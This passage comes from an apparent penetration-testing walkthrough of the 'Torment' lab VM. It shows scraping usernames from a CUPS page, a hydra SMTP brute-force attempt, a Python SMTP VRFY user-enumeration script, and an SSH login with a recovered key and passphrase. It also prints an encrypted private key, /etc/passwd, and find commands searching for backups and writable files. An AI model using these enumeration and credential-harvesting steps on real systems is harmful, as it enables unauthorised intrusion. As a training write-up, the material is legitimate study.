<span id="cb45-3"><a href="#cb45-3" aria-hidden="true"></a>    <span class="op">.</span><span class="fu">filter</span>(i <span class="kw">=&gt;</span> i<span class="op">.</span><span class="at">href</span><span class="op">.</span><span class="fu">includes</span>(<span class="st">&#39;/printer&#39;</span>))</span>
<span id="cb45-4"><a href="#cb45-4" aria-hidden="true"></a><span class="co">//(16) [{…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}]</span></span>
<span id="cb45-5"><a href="#cb45-5" aria-hidden="true"></a><span class="co">//0: {href: &#39;https://192.168.56.77:631/printers/&#39;, text: &#39;Printers&#39;}</span></span>
<span id="cb45-6"><a href="#cb45-6" aria-hidden="true"></a><span class="co">//1: {href: &quot;https://192.168.56.77:631/printers/Albert&#39;s_Personal_Printer&quot;, text: &quot;Albert&#39;s_Personal_Printer&quot;}</span></span>
<span id="cb45-7"><a href="#cb45-7" aria-hidden="true"></a><span class="co">//2: {href: &quot;https://192.168.56.77:631/printers/Cherrlt&#39;s_Personal_Printer&quot;, text: &quot;Cherrlt&#39;s_Personal_Printer&quot;}</span></span>
<span id="cb45-8"><a href="#cb45-8" aria-hidden="true"></a><span class="co">//3: {href: &quot;https://192.168.56.77:631/printers/David&#39;s_Personal_Printer&quot;, text: &quot;David&#39;s_Personal_Printer&quot;}</span></span>
<span id="cb45-9"><a href="#cb45-9" aria-hidden="true"></a><span class="co">//4: {href: &quot;https://192.168.56.77:631/printers/Edmund&#39;s_Personal_Printer&quot;, text: &quot;Edmund&#39;s_Personal_Printer&quot;}</span></span>
<span id="cb45-10"><a href="#cb45-10" aria-hidden="true"></a><span class="co">//5: {href: &quot;https://192.168.56.77:631/printers/Ethan&#39;s_Personal_Printer&quot;, text: &quot;Ethan&#39;s_Personal_Printer&quot;}</span></span>
<span id="cb45-11"><a href="#cb45-11" aria-hidden="true"></a><span class="co">//6: {href: &quot;https://192.168.56.77:631/printers/Eva&#39;s_Personal_Printer&quot;, text: &quot;Eva&#39;s_Personal_Printer&quot;}</span></span>
<span id="cb45-12"><a href="#cb45-12" aria-hidden="true"></a><span class="co">//7: {href: &quot;https://192.168.56.77:631/printers/Genevieve&#39;s_Personal_Printer&quot;, text: &quot;Genevieve&#39;s_Personal_Printer&quot;}</span></span>
<span id="cb45-13"><a href="#cb45-13" aria-hidden="true"></a><span class="co">//8: {href: &quot;https://192.168.56.77:631/printers/Govindasamy&#39;s_Personal_Printer&quot;, text: &quot;Govindasamy&#39;s_Personal_Printer&quot;}</span></span>
<span id="cb45-14"><a href="#cb45-14" aria-hidden="true"></a><span class="co">//9: {href: &quot;https://192.168.56.77:631/printers/Jessica&#39;s_Personal_Printer&quot;, text: &quot;Jessica&#39;s_Personal_Printer&quot;}</span></span>
<span id="cb45-15"><a href="#cb45-15" aria-hidden="true"></a><span class="co">//10: {href: &quot;https://192.168.56.77:631/printers/Kenny&#39;s_Personal_Printer&quot;, text: &quot;Kenny&#39;s_Personal_Printer&quot;}</span></span>
<span id="cb45-16"><a href="#cb45-16" aria-hidden="true"></a><span class="co">//11: {href: &quot;https://192.168.56.77:631/printers/Patrick&#39;s_Personal_Printer&quot;, text: &quot;Patrick&#39;s_Personal_Printer&quot;}</span></span>
<span id="cb45-17"><a href="#cb45-17" aria-hidden="true"></a><span class="co">//12: {href: &quot;https://192.168.56.77:631/printers/Qinyi&#39;s_Personal_Printer&quot;, text: &quot;Qinyi&#39;s_Personal_Printer&quot;}</span></span>
<span id="cb45-18"><a href="#cb45-18" aria-hidden="true"></a><span class="co">//13: {href: &quot;https://192.168.56.77:631/printers/Qiu&#39;s_Personal_Printer&quot;, text: &quot;Qiu&#39;s_Personal_Printer&quot;}</span></span>
<span id="cb45-19"><a href="#cb45-19" aria-hidden="true"></a><span class="co">//14: {href: &quot;https://192.168.56.77:631/printers/Roland&#39;s_Personal_Printer&quot;, text: &quot;Roland&#39;s_Personal_Printer&quot;}</span></span>
<span id="cb45-20"><a href="#cb45-20" aria-hidden="true"></a></span>
<span id="cb45-21"><a href="#cb45-21" aria-hidden="true"></a></span>
<span id="cb45-22"><a href="#cb45-22" aria-hidden="true"></a><span class="bu">Array</span><span class="op">.</span><span class="fu">from</span>(<span class="bu">document</span><span class="op">.</span><span class="fu">querySelectorAll</span>(<span class="st">&#39;a&#39;</span>))</span>
<span id="cb45-23"><a href="#cb45-23" aria-hidden="true"></a>    <span class="op">.</span><span class="fu">map</span>(i <span class="kw">=&gt;</span> ({<span class="dt">href</span><span class="op">:</span> i<span class="op">.</span><span class="at">href</span><span class="op">,</span> <span class="dt">text</span><span class="op">:</span> i<span class="op">.</span><span class="at">innerText</span>}))</span>
<span id="cb45-24"><a href="#cb45-24" aria-hidden="true"></a>    <span class="op">.</span><span class="fu">filter</span>(i <span class="kw">=&gt;</span> i<span class="op">.</span><span class="at">href</span><span class="op">.</span><span class="fu">includes</span>(<span class="st">&#39;/printer&#39;</span>))</span>
<span id="cb45-25"><a href="#cb45-25" aria-hidden="true"></a>    <span class="op">.</span><span class="fu">map</span>(i <span class="kw">=&gt;</span> i<span class="op">.</span><span class="at">text</span><span class="op">.</span><span class="fu">split</span>(<span class="st">&#39;</span><span class="sc">\&#39;</span><span class="st">&#39;</span>)[<span class="dv">0</span>]<span class="op">.</span><span class="fu">toLowerCase</span>())</span>
<span id="cb45-26"><a href="#cb45-26" aria-hidden="true"></a><span class="co">//(16) [&#39;printers&#39;, &#39;albert&#39;, &#39;cherrlt&#39;, &#39;david&#39;, &#39;edmund&#39;, &#39;ethan&#39;, &#39;eva&#39;, &#39;genevieve&#39;, &#39;govindasamy&#39;, &#39;jessica&#39;, &#39;kenny&#39;, &#39;patrick&#39;, &#39;qinyi&#39;, &#39;qiu&#39;, &#39;roland&#39;, &#39;sara&#39;]</span></span>
<span id="cb45-27"><a href="#cb45-27" aria-hidden="true"></a></span>
<span id="cb45-28"><a href="#cb45-28" aria-hidden="true"></a></span>
<span id="cb45-29"><a href="#cb45-29" aria-hidden="true"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="bu">Array</span><span class="op">.</span><span class="fu">from</span>(<span class="bu">document</span><span class="op">.</span><span class="fu">querySelectorAll</span>(<span class="st">&#39;a&#39;</span>))<span class="op">.</span><span class="fu">map</span>(i <span class="kw">=&gt;</span> ({<span class="dt">href</span><span class="op">:</span> i<span class="op">.</span><span class="at">href</span><span class="op">,</span> <span class="dt">text</span><span class="op">:</span> i<span class="op">.</span><span class="at">innerText</span>}))<span class="op">.</span><span class="fu">filter</span>(i <span class="kw">=&gt;</span> i<span class="op">.</span><span class="at">href</span><span class="op">.</span><span class="fu">includes</span>(<span class="st">&#39;/printer&#39;</span>))<span class="op">.</span><span class="fu">map</span>(i <span class="kw">=&gt;</span> i<span class="op">.</span><span class="at">text</span><span class="op">.</span><span class="fu">split</span>(<span class="st">&#39;</span><span class="sc">\&#39;</span><span class="st">&#39;</span>)[<span class="dv">0</span>]<span class="op">.</span><span class="fu">toLowerCase</span>())<span class="op">.</span><span class="fu">join</span>(<span class="st">&#39;</span><span class="sc">\n</span><span class="st">&#39;</span>))</span>
<span id="cb45-30"><a href="#cb45-30" aria-hidden="true"></a><span class="co">// albert</span></span>
<span id="cb45-31"><a href="#cb45-31" aria-hidden="true"></a><span class="co">// cherrlt</span></span>
<span id="cb45-32"><a href="#cb45-32" aria-hidden="true"></a><span class="co">// david</span></span>
<span id="cb45-33"><a href="#cb45-33" aria-hidden="true"></a><span class="co">// edmund</span></span>
<span id="cb45-34"><a href="#cb45-34" aria-hidden="true"></a><span class="co">// ethan</span></span>
<span id="cb45-35"><a href="#cb45-35" aria-hidden="true"></a><span class="co">// eva</span></span>
<span id="cb45-36"><a href="#cb45-36" aria-hidden="true"></a><span class="co">// genevieve</span></span>
<span id="cb45-37"><a href="#cb45-37" aria-hidden="true"></a><span class="co">// govindasamy</span></span>
<span id="cb45-38"><a href="#cb45-38" aria-hidden="true"></a><span class="co">// jessica</span></span>
<span id="cb45-39"><a href="#cb45-39" aria-hidden="true"></a><span class="co">// kenny</span></span>
<span id="cb45-40"><a href="#cb45-40" aria-hidden="true"></a><span class="co">// patrick</span></span>
<span id="cb45-41"><a href="#cb45-41" aria-hidden="true"></a><span class="co">// qinyi</span></span>
<span id="cb45-42"><a href="#cb45-42" aria-hidden="true"></a><span class="co">// qiu</span></span>
<span id="cb45-43"><a href="#cb45-43" aria-hidden="true"></a><span class="co">// roland</span></span>
<span id="cb45-44"><a href="#cb45-44" aria-hidden="true"></a><span class="co">// sara</span></span></code></pre></div>
<figure>
<img src="27.getting-users.png" alt="" /><figcaption>27.getting-users</figcaption>
</figure>
<pre class="shell"><code>hydra -L users.txt -p &quot;mostmachineshaveasupersecurekeyandalongpassphrase&quot; $RHOST smtp
...
[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 503 5.5.1 Error: authentication not enabled
...</code></pre>
<figure>
<img src="28.hydra-doesnot-work-on-smtp.png" alt="" /><figcaption>28.hydra-doesnot-work-on-smtp</figcaption>
</figure>
<p>Need to write a python script that will check login and find the user. But before that…</p>
<h2 id="looking-at-hexchat-again">Looking at HexChat again</h2>
<figure>
<img src="29.only-user-and-network-name-is-TORMENT.local.png" alt="" /><figcaption>29.only-user-and-network-name-is-TORMENT.local</figcaption>
</figure>
<h2 id="python-script-to-figure-out-the-user.">Python script to figure out the user.</h2>
<p><a href="figure-out-users.py">Checkout figure-out-users.py</a></p>
<div class="sourceCode" id="cb47"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true"></a><span class="co">#!/usr/bin/env python3</span></span>
<span id="cb47-2"><a href="#cb47-2" aria-hidden="true"></a></span>
<span id="cb47-3"><a href="#cb47-3" aria-hidden="true"></a><span class="im">import</span> socket</span>
<span id="cb47-4"><a href="#cb47-4" aria-hidden="true"></a></span>
<span id="cb47-5"><a href="#cb47-5" aria-hidden="true"></a>password<span class="op">=</span><span class="st">&quot;mostmachineshaveasupersecurekeyandalongpassphrase&quot;</span></span>
<span id="cb47-6"><a href="#cb47-6" aria-hidden="true"></a>users<span class="op">=</span>[<span class="st">&#39;printers&#39;</span>, <span class="st">&#39;albert&#39;</span>, <span class="st">&#39;cherrlt&#39;</span>, <span class="st">&#39;david&#39;</span>, <span class="st">&#39;edmund&#39;</span>, <span class="st">&#39;ethan&#39;</span>, <span class="st">&#39;eva&#39;</span>, <span class="st">&#39;genevieve&#39;</span>, <span class="st">&#39;govindasamy&#39;</span>, <span class="st">&#39;jessica&#39;</span>, <span class="st">&#39;kenny&#39;</span>, <span class="st">&#39;patrick&#39;</span>, <span class="st">&#39;qinyi&#39;</span>, <span class="st">&#39;qiu&#39;</span>, <span class="st">&#39;roland&#39;</span>, <span class="st">&#39;sara&#39;</span>]</span>
<span id="cb47-7"><a href="#cb47-7" aria-hidden="true"></a>addr<span class="op">=</span><span class="st">&quot;192.168.56.77&quot;</span></span>
<span id="cb47-8"><a href="#cb47-8" aria-hidden="true"></a>port<span class="op">=</span><span class="dv">25</span></span>
<span id="cb47-9"><a href="#cb47-9" aria-hidden="true"></a></span>
<span id="cb47-10"><a href="#cb47-10" aria-hidden="true"></a><span class="co"># print(users, password)</span></span>
<span id="cb47-11"><a href="#cb47-11" aria-hidden="true"></a></span>
<span id="cb47-12"><a href="#cb47-12" aria-hidden="true"></a><span class="cf">for</span> user <span class="kw">in</span> users:</span>
<span id="cb47-13"><a href="#cb47-13" aria-hidden="true"></a>    s <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span>
<span id="cb47-14"><a href="#cb47-14" aria-hidden="true"></a>    s.<span class="ex">connect</span>((addr, port))</span>
<span id="cb47-15"><a href="#cb47-15" aria-hidden="true"></a>    s.recv(<span class="dv">1024</span>)</span>
<span id="cb47-16"><a href="#cb47-16" aria-hidden="true"></a>    s.send(<span class="bu">bytes</span>(<span class="st">&quot;VRFY &quot;</span> <span class="op">+</span> user <span class="op">+</span> <span class="st">&quot;</span><span class="ch">\n</span><span class="st">&quot;</span>, <span class="st">&#39;utf-8&#39;</span>))</span>
<span id="cb47-17"><a href="#cb47-17" aria-hidden="true"></a>    data <span class="op">=</span> s.recv(<span class="dv">1024</span>).decode(<span class="st">&#39;utf-8&#39;</span>)</span>
<span id="cb47-18"><a href="#cb47-18" aria-hidden="true"></a>    <span class="cf">if</span> <span class="st">&quot;rejected&quot;</span> <span class="kw">not</span> <span class="kw">in</span> data:</span>
<span id="cb47-19"><a href="#cb47-19" aria-hidden="true"></a>        <span class="bu">print</span>(data)</span>
<span id="cb47-20"><a href="#cb47-20" aria-hidden="true"></a>    s.close()</span>
<span id="cb47-21"><a href="#cb47-21" aria-hidden="true"></a></span>
<span id="cb47-22"><a href="#cb47-22" aria-hidden="true"></a><span class="bu">print</span>(<span class="st">&quot;Done!&quot;</span>)</span></code></pre></div>
<pre class="shell"><code>python3 figure-out-users.py
252 2.0.0 patrick

252 2.0.0 qiu

Done!
</code></pre>
<figure>
<img src="30.figure-out-users.png" alt="" /><figcaption>30.figure-out-users</figcaption>
</figure>
<p>Well, two users I knew and confirmed were <code>qiu</code> and <code>patrick</code>. I am not surprised. Just exhausted.</p>
<p>I tried loggin in onto the printers page, with users and in title-cased names too, nothing.</p>
<h3 id="ssh-1">SSH</h3>
<p>We already have a key and a password. Let’s try that. SSH didn’t work the first time. Had to use -vvv first, and then it worked without it.</p>
<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
Wednesday 22 December 2021 05:10:47 PM IST 2021.12.22 17:10:47
f0c1s@kali:~/vuln-hubs/digitalworld.local/torment/ftp/.ssh $
ssh patrick@$RHOST -i id_rsa 
Enter passphrase for key &#39;id_rsa&#39;: 
Linux TORMENT 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Dec 23 01:10:36 2021 from 192.168.56.70
patrick@TORMENT:~$ whoami
patrick
patrick@TORMENT:~$ id
uid=1001(patrick) gid=1001(patrick) groups=1001(patrick)
patrick@TORMENT:~$ hostname
TORMENT
patrick@TORMENT:~$ date
Thu Dec 23 01:11:50 +08 2021
</code></pre>
<figure>
<img src="31.logged-in-as-patrick.png" alt="" /><figcaption>31.logged-in-as-patrick</figcaption>
</figure>
<h2 id="post-ssh">POST SSH</h2>
<pre class="shell"><code>patrick@TORMENT:~$ ls -lAhR
.:
total 24K
-rw------- 1 patrick patrick   65 Jan  4  2019 .bash_history
-rwx------ 1 patrick patrick  220 Dec 27  2018 .bash_logout
-rwx------ 1 patrick patrick 3.5K Dec 27  2018 .bashrc
drwxr-xr-x 2 patrick patrick 4.0K Dec 31  2018 .nano
-rwx------ 1 patrick patrick  675 Dec 27  2018 .profile
drwx------ 2 patrick patrick 4.0K Jan  4  2019 .ssh

./.nano:
total 0

./.ssh:
total 12K
-rw-r--r-- 1 patrick patrick  397 Jan  4  2019 authorized_keys
-rw------- 1 patrick patrick 1.8K Jan  4  2019 id_rsa
-rw-r--r-- 1 patrick patrick  397 Jan  4  2019 id_rsa.pubh</code></pre>
<h3 id="printing-every-file-in-.ssh">Printing every file in .ssh</h3>
<pre class="shell"><code>patrick@TORMENT:~$ for file in `ls .ssh`; do echo .ssh/$file; cat .ssh/$file; done
.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHt/mKzgDFJoGPkbuvTKiGcL9VdtDWSjEX1FnEmJ9b1ytfrusY6imq1JesqrVUZx/wvVpUBZGbtkuXKbrSx9FfYEUENnA2d8iXFeVhpOkrZk0dIP3c4/VuWRj0bj22i0LmdufK5nXvV1yCilwKyGDyaFlPp70NXR8aWT0KoFIQVzQoZK46MqVwvlB4fr8+cWuMGYZMSK6VsCuVJYxZzxEOTMUfp4XpQjy8w+gL/8yI8GqqIIYSLSzNXsaknh0Hib4a1MCe18xXK/Qg0ZR5Ir+CzX21KtHQ2JxlEhmxlZm7O20lcdSzKqkU/tbNh9qeXsXJd1cDFkjc6t5PuyEY77MN patrick@TORMENT
.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,C37F0C31D1560056EA1F9204EC405986

U9X/cW7GIiI48TQAzUs5ozEQgexHKiFi2NcoADhs/ax/CTJvZh32k+izzW0mMzl1
mo5HID0qNghIbVbRcN6Zv8cdJ/AhREjy25YZ68zA7GWoyfoch1K/XY0NEnNTchLf
b6k5GEgu5jfQT+pAj1A6jQyzz4A4CGbvD+iEEJRX3qsTlAn6th6dniRORJggnVLB
K4ONTeP4US7GSGTtOD+hwoyoR4zNQKT2Hn/WryoF7LdAXMwf1aNJJJ7YPz1YdSnU
fxXscbOMlXuZ4ouawIVGeYeH85lmOh7aBy5MWsYq/vNC+2pVzVEkRfc6jug1UbdG
hncWxfU92Q47lVuqtc4HPINynD2Q8rBlYrKsEbPqtLyCnBGM/T0Srzztj+IjXUD1
SdbVLmxascquwnIyv2w55vjwJv5dKjLBmrDiY0Doc9YYCGi6cz1p9tsE+G+uRg0r
hGuFXldsYEkoQcJ4iWjsYiqcwWWFfkN+A0rYXqqcDY+aqAy+jXkhyzfmUp3KBz9j
CjR1+7KcmKvNXtjn8V+iv2Nwf+qc2YzBNkBWlwHhxIz6L8F3k3OkqnZUqPKCW2Ga
CNMcIYx3+Gde3aXpHXg4OFALV7y23N8A2h97VOqnnrnED46C39shkA8iiMNdH9mz
87TWgw+wPLbWXJO7G5nJL0qciLV/Eo6atSof3FUx/4WX4fmYeg1Rdy0KgTC1NRGn
VT/YnlBrNW3f7fdhk/YhHbcT9vCg9/Nm3hmzQX/FBP085SgeEA+ebNMzQwPmqcfb
jGpMPdhD7iLmKPwQL3RFTVODjUyzsgJ6kz83aQd80qPClopqp4NFMLwATVpbN858
d4Q0QQGrCRqu2SYaYmVhGo37BJXKE11y0JzWXOhiVLD0I9fBoHDmsKHN4Aw3lbVE
/n+B0Qa1bIMGfXP7J4r7/+4trQCGi7ngVfhtygtg6j/HcoXDy9y15zrHZqKerWd6
6ApM1caan4T0FjqlqTOQsN5GmB9sBCu02VQ1QF3Z4FVA9oW+pkNFxAeKIddG1yLM
5L1ePDgEYjik6vM1lE/65c7fNaO8dndMau4reUnPbTFqKsTA46uUaMyOV6S7nsys
kHGcAXLEzvbC8ojK1Pg5Llok6f8YN+H7cP6vE1yCfx3oU3GdWV36AgBWLON8+Wwc
icoyqfW6E2I0xz5nlHoea/7szCNBI4wZmRI+GRcRgegQvG06QvdXNzjqdezbb4ba
EXRnMddmfjFSihlUhsKxLhCmbaJk5mG2oGLHQcOurvOUPh/qgRBfUf3PTntuUoa0
0+tGGaLYibDNb5eXQ39Bsjzm8BWG/dSK/Qq7UU4Bk2bTKikWQLazPAy482BsZpWI
mXt8ISmJqldgdrtnVvG3zoQBQpspZ6HTojheNazfD4zzvduQguOcKrCNICxoSRgA
egRER+uxaLqNGz+6H+9sl7FYWalMa+VzjrEDU7PeZNgOj9PxLdKbstQLQxC/Zq6+
7kYu2pHwqP2HcXmdJ9xYnptwkuqh5WGR82Zk+JkKwUBEQJmbVxjqWLjCV/CDA06z
6VvrfrPo3xt/CoZkH66qcm9LCTcM3DsLs3UT4B7aH5wk4l5MmpVI4/mx2Dlv0Mkv
-----END RSA PRIVATE KEY-----
.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHt/mKzgDFJoGPkbuvTKiGcL9VdtDWSjEX1FnEmJ9b1ytfrusY6imq1JesqrVUZx/wvVpUBZGbtkuXKbrSx9FfYEUENnA2d8iXFeVhpOkrZk0dIP3c4/VuWRj0bj22i0LmdufK5nXvV1yCilwKyGDyaFlPp70NXR8aWT0KoFIQVzQoZK46MqVwvlB4fr8+cWuMGYZMSK6VsCuVJYxZzxEOTMUfp4XpQjy8w+gL/8yI8GqqIIYSLSzNXsaknh0Hib4a1MCe18xXK/Qg0ZR5Ir+CzX21KtHQ2JxlEhmxlZm7O20lcdSzKqkU/tbNh9qeXsXJd1cDFkjc6t5PuyEY77MN patrick@TORMENT
</code></pre>
<pre class="shell"><code>patrick@TORMENT:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
rtkit:x:105:110:RealtimeKit,,,:/proc:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
geoclue:x:109:115::/var/lib/geoclue:/bin/false
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
pulse:x:112:116:PulseAudio daemon,,,:/var/run/pulse:/bin/false
avahi:x:113:119:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
colord:x:114:120:colord colour management daemon,,,:/var/lib/colord:/bin/false
saned:x:115:121::/var/lib/saned:/bin/false
hplip:x:116:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:117:122:Gnome Display Manager:/var/lib/gdm3:/bin/false
qiu:x:1000:1000:qiu,,,:/home/qiu:/bin/bash
statd:x:118:65534::/var/lib/nfs:/bin/false
Debian-exim:x:119:124::/var/spool/exim4:/bin/false
postfix:x:120:125::/var/spool/postfix:/bin/false
dovecot:x:121:127:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:122:128:Dovecot login user,,,:/nonexistent:/bin/false
patrick:x:1001:1001:,,,:/home/patrick:/bin/bash
mysql:x:123:129:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:124:130:ftp daemon,,,:/srv/ftp:/bin/false</code></pre>
<h3 id="cannot-open-qius-directory">cannot open qiu’s directory</h3>
<pre class="shell"><code>patrick@TORMENT:~$ ls -la ../qiu
ls: cannot open directory &#39;../qiu&#39;: Permission denied</code></pre>
<h3 id="recent-files">recent files</h3>
<pre class="shell"><code>patrick@TORMENT:~$ find / -type f -not -path &quot;/proc/*&quot; -not -path &quot;/sys/*&quot; -and -mtime -1 -and -not -user root -exec ls -l &quot;{}&quot; \; 2&gt;/dev/null
-rw-rw---- 1 mysql mysql 4 Dec 22 17:19 /run/mysqld/mysqld.pid
-rw-r--r-- 1 avahi avahi 4 Dec 22 17:19 /run/avahi-daemon/pid
-r--r--r-- 1 Debian-gdm Debian-gdm 11 Dec 22 17:19 /tmp/.X1024-lock
-rw------- 1 Debian-gdm Debian-gdm 0 Dec 22 17:21 /tmp/gnome-settings-daemon-screenshot-H3DQE1
-rw-rw---- 1 mysql mysql 12582912 Dec 22 17:19 /var/lib/mysql/ibdata1
-rw-rw---- 1 mysql mysql 50331648 Dec 22 17:19 /var/lib/mysql/ib_logfile0
-rw-rw---- 1 mysql mysql 24576 Dec 22 17:19 /var/lib/mysql/tc.log
-rw------- 1 postfix postfix 33 Dec 22 17:19 /var/lib/postfix/master.lock
-rw------- 1 postfix postfix 8192 Dec 22 17:24 /var/lib/postfix/smtp_scache.db
-rw------- 1 postfix postfix 8192 Dec 22 17:24 /var/lib/postfix/smtpd_scache.db
-rw------- 1 postfix postfix 1024 Dec 23 00:53 /var/lib/postfix/prng_exch
-rw------- 1 Debian-gdm Debian-gdm 5732 Dec 22 17:19 /var/lib/gdm3/.ICEauthority
</code></pre>
<h3 id="find-backup">Find backup</h3>
<pre class="shell"><code>patrick@TORMENT:~$ find / -type f -not -path &quot;/proc/*&quot; -not -path &quot;/sys/*&quot; -and -mtime -1 -and -not -user root -exec ls -l &quot;{}&quot; \; 2&gt;/dev/null
-rw-rw---- 1 mysql mysql 4 Dec 22 17:19 /run/mysqld/mysqld.pid
-rw-r--r-- 1 avahi avahi 4 Dec 22 17:19 /run/avahi-daemon/pid
-r--r--r-- 1 Debian-gdm Debian-gdm 11 Dec 22 17:19 /tmp/.X1024-lock
-rw------- 1 Debian-gdm Debian-gdm 0 Dec 22 17:21 /tmp/gnome-settings-daemon-screenshot-H3DQE1
-rw-rw---- 1 mysql mysql 12582912 Dec 22 17:19 /var/lib/mysql/ibdata1
-rw-rw---- 1 mysql mysql 50331648 Dec 22 17:19 /var/lib/mysql/ib_logfile0
-rw-rw---- 1 mysql mysql 24576 Dec 22 17:19 /var/lib/mysql/tc.log
-rw------- 1 postfix postfix 33 Dec 22 17:19 /var/lib/postfix/master.lock
-rw------- 1 postfix postfix 8192 Dec 22 17:24 /var/lib/postfix/smtp_scache.db
-rw------- 1 postfix postfix 8192 Dec 22 17:24 /var/lib/postfix/smtpd_scache.db
-rw------- 1 postfix postfix 1024 Dec 23 00:53 /var/lib/postfix/prng_exch
-rw------- 1 Debian-gdm Debian-gdm 5732 Dec 22 17:19 /var/lib/gdm3/.ICEauthority
patrick@TORMENT:~$ find / -type f -name &quot;*bak&quot; -exec ls -lh &quot;{}&quot; \; 2&gt;/dev/null
-rw-r--r-- 1 root root 1.5K Dec 27  2018 /etc/postfix/main.cf.bak
-rw------- 1 root shadow 840 Dec 31  2018 /var/backups/gshadow.bak
-rw------- 1 root root 2.5K Dec 31  2018 /var/backups/passwd.bak
-rw------- 1 root shadow 1.6K Dec 31  2018 /var/backups/shadow.bak
-rw------- 1 root root 1010 Dec 31  2018 /var/backups/group.bak
patrick@TORMENT:~$ find / -type d -name &quot;*backup*&quot; 2&gt;/dev/null
/var/backups
patrick@TORMENT:~$ find / -type f -name &quot;*backup*&quot; 2&gt;/dev/null
/lib/modules/4.9.0-8-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
/usr/bin/mariabackup
/usr/bin/wsrep_sst_xtrabackup
/usr/bin/wsrep_sst_mariabackup
/usr/bin/wsrep_sst_xtrabackup-v2
/usr/bin/tdbbackup.tdbtools
/usr/share/man/man8/tdbbackup.tdbtools.8.gz
/usr/share/man/man1/wsrep_sst_xtrabackup-v2.1.gz
/usr/share/man/man1/wsrep_sst_xtrabackup.1.gz
/usr/share/man/man1/wsrep_sst_mariabackup.1.gz
/usr/share/evolution/errors/org-gnome-backup-restore.error
/usr/share/help/kn/gnome-help/backup-where.page
...</code></pre>
<figure>
<img src="32.find-backup.png" alt="" /><figcaption>32.find-backup</figcaption>
</figure>
<h3 id="etcpasswdshadow">/etc/{passwd<em>,shadow</em>}</h3>
<pre class="shell"><code>patrick@TORMENT:~$ ls -la /etc/{passwd*,shadow*}
-rw-r--r-- 1 root root   2485 Dec 31  2018 /etc/passwd
-rw------- 1 root root   2472 Dec 31  2018 /etc/passwd-
-rw-r----- 1 root shadow 1575 Dec 31  2018 /etc/shadow
-rw------- 1 root root   1575 Dec 31  2018 /etc/shadow-</code></pre>
<h3 id="find-files-writable-by-userpatrick">Find files writable by user:patrick</h3>
<pre class="shell"><code>patrick@TORMENT:~$ find / -writable -not -path &quot;/proc*&quot; -not -path &quot;/sys*&quot; 2&gt;/dev/null
/run/minissdpd.sock
/run/dovecot/auth-userdb
/run/dovecot/dns-client
/run/dovecot/imap-urlauth
/run/dovecot/indexer
/run/dovecot/ssl-params
/run/mysqld/mysqld.sock
/run/avahi-daemon/socket
/run/dbus/system_bus_socket
/run/cups/cups.sock
/run/user/1001
/run/user/1001/bus
/run/user/1001/gnupg
/run/user/1001/gnupg/S.gpg-agent
/run/user/1001/gnupg/S.gpg-agent.ssh
/run/user/1001/gnupg/S.gpg-agent.extra
/run/user/1001/gnupg/S.gpg-agent.browser
/run/user/1001/systemd
/run/user/1001/systemd/private
/run/user/1001/systemd/notify
/run/user/1001/systemd/transient
/run/samba/nmbd/unexpected
/run/shm
/run/rpcbind.sock
/run/systemd/journal/socket
/run/systemd/journal/stdout
/run/systemd/journal/dev-log
/run/systemd/journal/syslog
/run/systemd/private
/run/systemd/notify
/run/lock
/lib/systemd/system/mountkernfs.service
/lib/systemd/system/bootlogd.service
/lib/systemd/system/cryptdisks-early.service
/lib/systemd/system/umountroot.service
/lib/systemd/system/stop-bootlogd-single.service
/lib/systemd/system/rmnologin.service
